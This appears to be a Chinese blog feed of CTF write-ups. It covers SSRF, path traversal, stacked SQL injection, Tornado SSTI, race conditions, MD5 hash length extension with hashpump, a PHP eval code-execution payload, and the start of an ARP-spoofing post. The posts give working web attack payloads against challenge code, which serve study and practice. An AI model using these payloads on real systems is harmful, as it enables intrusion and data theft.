    <link href="http://yoursite.com/2019/08/02/SSRF/"/>
    <id>http://yoursite.com/2019/08/02/SSRF/</id>
    <published>2019-08-02T02:38:27.000Z</published>
    <updated>2019-08-13T09:52:13.145Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF和De1CTF两道题目"><a href="#BUUCTF和De1CTF两道题目" class="headerlink" title="BUUCTF和De1CTF两道题目"></a>BUUCTF和De1CTF两道题目</h2><p>两道SSRF的题目，一次复现，一次做一天才做出来(上午就能出的，我是sb)整理了一下<br><a id="more"></a></p><h3 id="SSRFme-BUUCTF"><a href="#SSRFme-BUUCTF" class="headerlink" title="SSRFme(BUUCTF)"></a>SSRFme(BUUCTF)</h3><pre><code>&lt;?phpif (isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;])) {  $_SERVER[&apos;REMOTE_ADDR&apos;] = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];}$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);@mkdir($sandbox);@chdir($sandbox);$data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));$info = pathinfo($_GET[&quot;filename&quot;]);$dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));@mkdir($dir);@chdir($dir);@file_put_contents(basename($info[&quot;basename&quot;]), $data);highlight_file(__FILE__); </code></pre><p>题目解析<br>1.首先madir创建sandbox/+md5(orange+你的ip)目录，并用chdir修改当前目录<br>2.shell_exec函数会执行内部的代码，返回值为执行命令后所获取内容的第一行<br>3.GET命令执行传入的url参数，GET是Lib for WWW in Perl中的命令 目的是模拟http的GET请求<br>4.escapeshellarg函数将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。<br>5.pathinfo() 函数以数组的形式返回文件路径的信息。  </p><pre><code>&lt;?php print_r(pathinfo(&quot;/testweb/test.txt&quot;));?&gt;输出：Array([dirname] =&gt; /testweb [basename] =&gt; test.txt [extension] =&gt; txt)</code></pre><p>5.传入filename的最后一级文件夹并将shell_exec函数返回的数据写入文件，可以通过sandbox/+md5(orange+你的ip)/文件名访问</p><p>访问根目录<br>    ?url=/&amp;filename=a</p><p>ip查询，REMOTE_ADDR获取的访问的本机ip<br>之后可以在sandbox/…../a看到目录，有flag，但是无法访问</p><p><img src="/2019/08/02/SSRF/2.png" alt=" "></p><p>然后在大佬wp中发现</p><pre><code>perl在open当中可以执行命令，如:open(FD, &quot;ls|&quot;)或open(FD, &quot;|ls&quot;)都可以执行ls命令  而GET是在perl下执行的，当GET使用file协议的时候就会调用到perl的open函数</code></pre><p>也就是GET中使用file协议可以执行命令，但是需要bash -c</p><p>Linux所提供的管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入</p><p>构造url：</p><pre><code>?url=file:bash -c /readflag|&amp;filename=a    bash -c 执行了命令访问sandbox/...../a拿到flag</code></pre><h3 id="SSRFme-De1CTF"><a href="#SSRFme-De1CTF" class="headerlink" title="SSRFme(De1CTF)"></a>SSRFme(De1CTF)</h3><p>题目源码</p><pre><code>/#! /usr/bin/env python/#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&apos;latin1&apos;)app = Flask(__name__)secert_key = os.urandom(16)class Task:def __init__(self, action, param, sign, ip):    self.action = action    self.param = param    self.sign = sign    self.sandbox = md5(ip)    if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr        os.mkdir(self.sandbox)def Exec(self):    result = {}    result[&apos;code&apos;] = 500    if (self.checkSign()):        if &quot;scan&quot; in self.action:            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)            resp = scan(self.param)            if (resp == &quot;Connection Timeout&quot;):                result[&apos;data&apos;] = resp            else:                print resp                tmpfile.write(resp)                tmpfile.close()            result[&apos;code&apos;] = 200        if &quot;read&quot; in self.action:            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)            result[&apos;code&apos;] = 200            result[&apos;data&apos;] = f.read()        if result[&apos;code&apos;] == 500:            result[&apos;data&apos;] = &quot;Action Error&quot;    else:        result[&apos;code&apos;] = 500        result[&apos;msg&apos;] = &quot;Sign Error&quot;    return resultdef checkSign(self):    if (getSign(self.action, self.param) == self.sign):        return True    else:        return False/#generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])def geneSign():param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))action = &quot;scan&quot;return getSign(action, param)@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])def challenge():action = urllib.unquote(request.cookies.get(&quot;action&quot;))param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))ip = request.remote_addrif(waf(param)):    return &quot;No Hacker!!!!&quot;task = Task(action, param, sign, ip)return json.dumps(task.Exec())@app.route(&apos;/&apos;)def index():return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):socket.setdefaulttimeout(1)try:    return urllib.urlopen(param).read()[:50]except:    return &quot;Connection Timeout&quot;def getSign(action, param):return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):return hashlib.md5(content).hexdigest()def waf(param):check=param.strip().lower()if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):    return Trueelse:    return Falseif __name__ == &apos;__main__&apos;:app.debug = Falseapp.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><p>题目分析：</p><pre><code>def __init__（self, action, param, sign, ip）初始化self类，后面的都是self类的参数</code></pre><p>@app.route(‘/‘)改变url路径</p><p>waf函数中strip函数删除了param参数前后缀的字符，lower函数将大写变成小写，并检测参数前缀是不是file和gopher，</p><p>首先是前几天补的hash长度拓展攻击，geneSign函数那那可以得到action=scan时候的md5(key+param+action)，hashpump在action参数后面补位加了个read，生成新的md5和action参数，才可以打印出data的内容</p><pre><code>/De1ta?param=http://139.180.128.86  Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%01%00%00%00%00%00%00read;sign=81670763d66ae6d466304b9106550817</code></pre><p>可以通过scan函数中urllib.urlopen(param).read()[:50]得到一部分网页内容</p><pre><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;#! /usr/bin/env python\r\n#encoding=utf-8\r\nfrom flas&quot;}</code></pre><p>file和gopher协议都被过滤了，然后就卡住了，</p><p>本来觉得可能是python urllib库的一个cve，后来发现好像不行<br>    <a href="http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo这样可以注入HTTP头" target="_blank" rel="noopener">http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo这样可以注入HTTP头</a><br>然后突然发现urlopen可以直接读取文件，结合hint：flag.txt直接让param为flag.txt就能拿到flag（太草了，那你弄什么waf函数</p><pre><code>De1ta?param=flag.txtCookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=d7163f39ab78a698b3514fd465e4018a</code></pre><p><img src="/2019/08/02/SSRF/1.png" alt=" "> </p><h3 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）也就是说通过普通用户可以访问的网站，来攻击内部网络系统。</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能(服务器会响应用户的url请求)且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;BUUCTF和De1CTF两道题目&quot;&gt;&lt;a href=&quot;#BUUCTF和De1CTF两道题目&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF和De1CTF两道题目&quot;&gt;&lt;/a&gt;BUUCTF和De1CTF两道题目&lt;/h2&gt;&lt;p&gt;两道SSRF的题目，一次复现，一次做一天才做出来(上午就能出的，我是sb)整理了一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF(1)</title>
    <link href="http://yoursite.com/2019/07/28/BUUCTF-1/"/>
    <id>http://yoursite.com/2019/07/28/BUUCTF-1/</id>
    <published>2019-07-28T09:27:59.000Z</published>
    <updated>2019-10-11T07:57:51.451Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BUUCTF"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h2><p>好多之前比赛没做也没来得及补的题，良心平台QAQ</p><a id="more"></a><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>source.php里源码</p><pre><code>&lt;?phphighlight_file(__FILE__);class emmm{    public static function checkFile(&amp;$page)    {        $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];        if (! isset($page) || !is_string($page)) {            echo &quot;you can&apos;t see it&quot;;            return false;        }        if (in_array($page, $whitelist)) {            return true;        }        $_page = mb_substr(            $page,            0,            mb_strpos($page . &apos;?&apos;, &apos;?&apos;)        );        if (in_array($_page, $whitelist)) {            return true;        }        $_page = urldecode($page);        $_page = mb_substr(            $_page,            0,            mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)        );        if (in_array($_page, $whitelist)) {            return true;        }        echo &quot;you can&apos;t see it&quot;;        return false;    }}if (! empty($_REQUEST[&apos;file&apos;])    &amp;&amp; is_string($_REQUEST[&apos;file&apos;])    &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])) {    include $_REQUEST[&apos;file&apos;];    exit;} else {    echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;}  ?&gt; </code></pre><p>可以看到我们需要get传递file参数；<br>checkFile函数检查了传递参数；<br>mb_strpos函数检测第一次出现? 的位置；<br>mb_substr函数返回了file参数0和第一个问号之间的值，<br>in_array函数检测在$whitelist是否含$_page的值也就是source.php和hint.php</p><p>之后存在include函数，所以我们构造payload:</p><pre><code>?file=hint.php?/../../../../../../../../ffffllllaaaagggg</code></pre><p>hint.php?/被当成了目录<br>拿到flag</p><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>测试1’or 1=1#可行，存在sql注入<br>1’order by 2#可行，到3报错，查询列数为2<br>然后测试 1’union select 1,2#</p><pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);  </code></pre><p>select被过滤了，show没有被过滤，构造闭合语句进行<br>查询  </p><h4 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h4><p>在mysql中前语句闭合分号结束后后面的语句也会被执行<br><img src="/2019/07/28/BUUCTF-1/2.png" alt=" "></p><p>查询：  </p><pre><code>1&apos;;show databases;</code></pre><p><img src="/2019/07/28/BUUCTF-1/1.png" alt=" "></p><pre><code>1&apos;;show tables;</code></pre><p><img src="/2019/07/28/BUUCTF-1/3.png" alt=" "></p><pre><code>1&apos;;show columns from 1919810931114514;</code></pre><p>(不知道为啥查不出来<br>破案了，字符串作为表名需要加反引号</p><pre><code>1&apos;;show columns from `1919810931114514`;</code></pre><p><img src="/2019/07/28/BUUCTF-1/5.png" alt=" ">‘</p><p>但到此处就无法查询字段的内容了  </p><h4 id="存储过程绕过"><a href="#存储过程绕过" class="headerlink" title="存储过程绕过"></a>存储过程绕过</h4><p>sql serve中给变量幅值可以用</p><pre><code>set @变量名=&apos;字符串&apos;;</code></pre><p>prepare语句用于预备一个语句，并指定语句名称，以后可用名称引用该语句。语句名称对大小写不敏感。from后可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。该文本必须表现为一个单一的SQL语句，而不是多个语句。<br>语法</p><pre><code>prepare 语句定义名称 from 变量名称;</code></pre><p>execute语句用于执行命令<br>语法   </p><pre><code>execute 变量名称;</code></pre><p><img src="/2019/07/28/BUUCTF-1/6.png" alt=" "><br>payload：</p><pre><code>1&apos;;Set @a=concat(&apos;s&apos;,&apos;elect * from `1919810931114514`&apos;);prepare s from @a;execute s;</code></pre><p>strstr对set进行了一步过滤，不过没什么影响，大小写就能绕过(这么看这种解法应该是预期解。</p><h4 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h4><p>正则中没有过滤alert和rename关键字  </p><p>alter和rename命令</p><p>alter table 原表名 rename to 新表名;</p><p>alter table 表名 change 要修改的字段名  新字段名 新字段的数据类型;</p><p><img src="https://img-blog.csdnimg.cn/20190528174146842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI2NDA2NDQ3,size_16,color_FFFFFF,t_70" alt="8"></p><p>查询的是words表，有两列id和data；</p><p>我们猜测他的查询语句为<code>select * from words where id=</code></p><p>1.将words表改名为其它名字</p><p>2.1919810931114514改名为words</p><p>3.将flag改名为id；</p><p>然后直接查询1就可以找到flag；</p><p>题目环境好像出现了一些问题，没有复现成功QAQ</p><p>suctf sql也是堆叠注入；绕了半天没绕过去，后来发现是git源码泄露，select *一行就查出来了QAQ</p><h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h3><p>开始以为是hash长度拓展攻击，但是没有secret长度，file参数传递也要是/fllllllllllllag，试了半天没试出来QAQ，看了writeup，error那存在ssti，（自闭了 貌似是render提示了是ssti</p><pre><code>http://web9.buuoj.cn/error?msg={{globals}}</code></pre><p>加号被过滤了2不行，其他测试都是orz</p><pre><code>http://web9.buuoj.cn/error?msg={{handler.settings}}</code></pre><p>handler.settings内有cookie_secret（又自闭了，为什么QAQ<br>tornado框架里handler.settings保存一些配置选项</p><pre><code>settings，使用tornado.web.Application(handler, **settings)我们却不知道这个settings到底是什么，究竟有什么作用，今天就来介绍一下settings是一个字典，主要保存一些配置选项</code></pre><p>拿到cookie_secret就拿到flag了</p><h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>当vim不正常退出时，比如你编辑的文件config.php，由于vim的不正常退出，此时会在同目录下生成:config.php.swp，由于此类格式文件无法解析，此时便可以通过浏览器直接下载此敏感文件！</p><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><h4 id="补充一下条件竞争："><a href="#补充一下条件竞争：" class="headerlink" title="补充一下条件竞争："></a>补充一下条件竞争：</h4><p>下面以相关操作逻辑顺序设计的不合理为例，具体讨论一下这类问题的成因。在很多系统中都会包含上传文件或者从远端获取文件保存在服务器的功能（如：允许用户使用网络上的图片作为自己的头像的功能），下面是一段简单的上传文件释义代码：</p><pre><code>&lt;?php  if(isset($_GET[&apos;src&apos;])){    copy($_GET[&apos;src&apos;],$_GET[&apos;dst&apos;]);    //...    //check file    unlink($_GET[&apos;dst&apos;]);    //... }?&gt;</code></pre><p>这段代码看似一切正常，先通过copy($GET[‘src’],$GET[‘dst’])将文件从源地址复制到目的地址，然后检查$GET[‘dst’]的安全性，如果发现$GET[‘dst’]不安全就马上通过unlink($_GET[‘dst’])将其删除。但是，当程序在服务端并发处理用户请求时问题就来了。如果在文件上传成功后但是在相关安全检查发现它是不安全文件删除它以前这个文件就被执行了那么会怎样呢？</p><p>假设攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell文件，后续的一切就都不是问题了。</p><p>由上述过程我们可以看到这种“先将猛兽放进屋，再杀之”的处理逻辑在并发的情况下是十分危险的，极易导致条件竞争漏洞的发生。  </p><p>仍以上述情境为例，攻击者通过不断地发起访问上传的恶意文件请求的方法成功的将原有处理不安全文件，一个脚本多线程发包，一个脚本不断去访问上传的文件生成shell文件</p><pre><code>上传文件E→删除不安全文件E</code></pre><p>的业务逻辑变成了</p><pre><code>上传文件E→访问执行文件E，生成shell文件S→删除不安全文件E</code></pre><p>不安全文件E虽然被删除了，但是有它生成出来的shell文件S却保留在了服务器中，对攻击者来说这个shell文件S才是后续攻击的关键。</p><p>原文链接：<a href="http://wiki.secbug.net/web_race-condtion.html" target="_blank" rel="noopener">http://wiki.secbug.net/web_race-condtion.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;BUUCTF&quot;&gt;&lt;a href=&quot;#BUUCTF&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF&quot;&gt;&lt;/a&gt;BUUCTF&lt;/h2&gt;&lt;p&gt;好多之前比赛没做也没来得及补的题，良心平台QAQ&lt;/p&gt;
    
    </summary>
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
      <category term="WP" scheme="http://yoursite.com/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>Hash长度扩展攻击</title>
    <link href="http://yoursite.com/2019/07/27/Hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/07/27/Hash长度扩展攻击/</id>
    <published>2019-07-27T10:19:26.000Z</published>
    <updated>2019-08-03T05:15:40.625Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hash长度扩展攻击"><a href="#Hash长度扩展攻击" class="headerlink" title="Hash长度扩展攻击"></a>Hash长度扩展攻击</h2><p>很早之前蓝鲸ctf的时候就遇到了hash扩展长度攻击的问题，当时没有整理，趁把这道题放夏令营的时候整理一下<br><a id="more"></a></p><pre><code>&lt;?php //$flag and $secret in flag.php and strlen($secret)==15include(&quot;flag.php&quot;);if(!isset($_POST[&apos;username&apos;])){show_source(__FILE__);die();}$username = $_POST[&quot;username&quot;];$password = $_POST[&quot;password&quot;];    if (!empty($_COOKIE[&quot;getmein&quot;])) {    if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) {    if ($_COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) {        echo &quot;Congratulations! You are a registered user.\n&quot;;        die (&quot;The flag is &quot;. $flag);    }    else {        die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;);    }}else {    die (&quot;You are not an admin! LEAVE.&quot;);}}setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[&quot;source&quot;])) {    setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7));}else {if ($_COOKIE[&quot;source&quot;] != 0) {    echo &quot;&quot;; // This source code is outputted here}}</code></pre><p>我们已知的是：  </p><pre><code>md5($secret.adminadmin)= 2aba05712564dde4fb15fdb5f0e0de66;以及$secret的长度为15；  </code></pre><p>我们要得到的是如何构造一个$password让</p><pre><code>md5($secret . urldecode($username . $password)))已知，并构造cookie；  </code></pre><p>此处我们并不知道$secret的值是什么，password又不能等于admin，所以我们需要用到hash长度扩展攻击；相当于是现在我们不知道字符串是什么。只知道其长度，通过hash长度拓展攻击，我们可以得到在原字符串的基础上进行了补位以及添加新字符串的hash值</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>首先，当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。以上过程，称之为补位。</p><p>补位完成后，字符串以64位一组进行分组（因为上面的余数为56,加上8个字节的长度描述符后，正好是64位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。</p><p>（原理原文链接：<a href="http://www.freebuf.com/articles/web/69264.html）" target="_blank" rel="noopener">www.freebuf.com/articles/web/69264.html）</a></p><p>也就是说我们先对$secret.adminadmin进行补位，然后添加一个新的字符串，用补位完成后那个分组生成的register值对新添加的字符串进性运算得到最后的hash值，而补位完成后那个分组的register值和我们已知的md5($secret.adminadmin)值相等。</p><h3 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h3><p>HashPump是一个借助于OpenSSL实现了针对多种散列函数的攻击的工具，支持针对MD5、CRC32、SHA1、SHA256和SHA512等长度扩展攻击。而MD2、SHA224和SHA384算法不受此攻击的影响。</p><p>安装</p><pre><code>git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install</code></pre><p>所需数据</p><pre><code>root@ubuntu:~/HashPump# hashpumpInput Signature: 2aba05712564dde4fb15fdb5f0e0de66//hash值Input Data: adminadmin//加密的明文Input Key Length: 15//key长度Input Data to Add: 1286d5b319a75f5f498dac9a52dcb360e//新生成的md5也就是getmeinadminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x001//admin.$passowrd</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Hash长度扩展攻击&quot;&gt;&lt;a href=&quot;#Hash长度扩展攻击&quot; class=&quot;headerlink&quot; title=&quot;Hash长度扩展攻击&quot;&gt;&lt;/a&gt;Hash长度扩展攻击&lt;/h2&gt;&lt;p&gt;很早之前蓝鲸ctf的时候就遇到了hash扩展长度攻击的问题，当时没有整理，趁把这道题放夏令营的时候整理一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Dockerfile搭建简单Web题目</title>
    <link href="http://yoursite.com/2019/07/11/Dockerfile%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95Web%E9%A2%98%E7%9B%AE/"/>
    <id>http://yoursite.com/2019/07/11/Dockerfile搭建简单Web题目/</id>
    <published>2019-07-11T02:24:50.000Z</published>
    <updated>2019-08-01T04:45:07.259Z</updated>
    
    <content type="html"><![CDATA[<p>CTF赛程结束后，Web题目环境关了不是太好复现，学习了下怎么用Dockerfile来重新搭建一下环境（只学会了怎么用，自己出题还是不会写，菜哭）<br><a id="more"></a></p><h2 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h2><h2 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h2><p>拉取镜像： </p><pre><code>docker pull imagename  </code></pre><p>查看docker当前镜像：   </p><pre><code>docker images  </code></pre><p>新建一个docker容器，并映射端口号：</p><pre><code>docker run -d -p host port:docker port imagename</code></pre><p>用到的一些命令： </p><pre><code>-d  后台运行-P(大写)  随机把容器的端口映射到一个主机未使用的高端口-p(小写)  格式为主机端口：容器端口 ，自选端口映射-i  以交互模式运行容器，常与-t连用-t  为容器重新分配一个伪输入终端，常与-i连用</code></pre><p>查看运行中的docker容器：</p><pre><code>docker ps -a </code></pre><p>进入一个docker容器：</p><pre><code>docker exec -it container—id bash</code></pre><p>拷贝本地文件到docker：</p><pre><code>docker cp /root/ container id:容器内路径（var/www/html）</code></pre><p>开始/停止容器</p><pre><code>docker start/stop container id</code></pre><p>首先我们在github下载开源的Web题目源码<br>php4fun的好多challenge，选取了challenge2</p><p>利用xftp6将文件上传到服务器root文件夹下，cd命令进入该文件，</p><pre><code>docker build -t w .</code></pre><p>使用下载的dockerfile文件创建一个命名为w的镜像</p><p>新建容器，并随机分配端口</p><pre><code>docker run -d -P w</code></pre><p><img src="/2019/07/11/Dockerfile搭建简单Web题目/2.png" alt=" "> </p><p>访问32774端口，题目搭建完成</p><p><img src="/2019/07/11/Dockerfile搭建简单Web题目/1.png" alt=" "> </p><h2 id="搭建时遇到的问题"><a href="#搭建时遇到的问题" class="headerlink" title="搭建时遇到的问题"></a>搭建时遇到的问题</h2><pre><code>docker: Error response from daemon: OCI runtime create failed: container_linux.go:345: starting container process caused &quot;exec: \&quot;httpd-foreground\&quot;: executable file not found in $PATH&quot;: unknown.</code></pre><p>解决方案 更改文件权限</p><pre><code>chmod +x httpd-foreground</code></pre><h2 id="解题payload："><a href="#解题payload：" class="headerlink" title="解题payload："></a>解题payload：</h2><h3 id="PHP-复杂变量"><a href="#PHP-复杂变量" class="headerlink" title="PHP 复杂变量"></a>PHP 复杂变量</h3><p>PHP 中的变量用一个$+变量名来表示。变量区分大小写，我们还可以利用${xxx}的形式来表达一个变量。</p><p>函数、方法、静态类变量和类常量只有在 PHP 5 以后才可在 {$} 中使用。然而，只有在该字符串被定义的命名空间中才可以将其值作为变量名来访问。只单一使用花括号 ({}) 无法处理从函数或方法的返回值或者类常量以及类静态变量的值。</p><p>eval()函数函数的作用如下：  eval() 函数把字符串按照 PHP 代码来计算。   该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>题目意思：接受一个$_GET[‘str’]的传参，在经过addslashes()函数转义特殊符号与正则表达式检验之后，传入eval()当中拼接到$str=””;变量当中。</p><pre><code>?str=${phpinfo()}</code></pre><p>但phpinfo()并非变量名却依旧执行了该命令，在 php 中，可以接受函数的返回值作为变量名，而phpinfo()的返回值为TRUE，所以先将phpinfo()执行了，将返回值返回作为了变量名。<br>读取flag.php的内容：</p><pre><code>?str=${eval($_REQUEST[c])}&amp;c=system(&apos;cat *&apos;);</code></pre><p>执行了eval($_REQUEST[c]，并用其返回值表达了一个变量。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF赛程结束后，Web题目环境关了不是太好复现，学习了下怎么用Dockerfile来重新搭建一下环境（只学会了怎么用，自己出题还是不会写，菜哭）&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="基础" scheme="http://yoursite.com/categories/%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="基础" scheme="http://yoursite.com/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>ARP攻击</title>
    <link href="http://yoursite.com/2019/05/04/ARP%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2019/05/04/ARP攻击/</id>
    <published>2019-05-04T08:15:58.000Z</published>
    <updated>2019-07-16T10:02:53.666Z</updated>
    
    <content type="html"><![CDATA[<p>折腾了大半天，最后也只是了解了arp攻击一些最基础的语句，可扫描当前局域网下连接的ip地址，对指定的ip断网，局限性很高，需要在内网，仅限日常娱乐，一些监听之类的操作还需要补知识（菜是原罪）。</p><h3 id="ARP欺骗原理"><a href="#ARP欺骗原理" class="headerlink" title="ARP欺骗原理"></a>ARP欺骗原理</h3><p>其主要原理是局域网内的”攻击机”通过冒充同网络号下的”受害者主机”的物理地址（mac地址），通过欺骗网关，让网关原来应该发给“受害者主机”的数据包转而发给“攻击机”，这就导致了“受害者主机”无法收到应答的数据包，也就等于断网了。本实验的过程也就是常说的  ARP欺骗。<br><a id="more"></a></p><h3 id="IP地址，子网掩码，网关定义"><a href="#IP地址，子网掩码，网关定义" class="headerlink" title="IP地址，子网掩码，网关定义"></a>IP地址，子网掩码，网关定义</h3><h4 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h4><p>IP地址：为了使连入Internet的众多电脑主机在通信时能够相互识别，Internet中的每一台主机都分配有一个唯一的32位地址，该地址称为IP地址，也称作网际地址。IP地址由4个数组成，每个数可取值0～255。</p><h4 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h4><p>子网掩码只有一个作用，就是将某个IP地址划分成网络地址和主机地址两部分。 子网掩码的设定必须遵循一定的规则。与IP地址相同，子网掩码的长度也是32位，左边是网络位，用二进制数字“1”表示；右边是主机位，用二进制数字“0”表示。例如IP地址为“192.168.1.1”和子网掩码为“255.255.255.0”。其中，“1”有24个，代表与此相对应的IP地址左边24位是网络号；“0”有8个，代表与此相对应的IP地址右边8位是主机号。这样，子网掩码就确定了一个IP地址的32位二进制数字中哪些是网络号、哪些是主机号。</p><h4 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h4><p>大家都知道，从一个房间走到另一个房间，必然要经过一扇门。同样，从一个网络向另一个网络发送信息，也必须经过一道“关口”，这道关口就是网关。顾名思义，网关(Gateway)就是一个网络连接到另一个网络的“关口”。同一局域网下的网关相同。</p><h3 id="arpspoof"><a href="#arpspoof" class="headerlink" 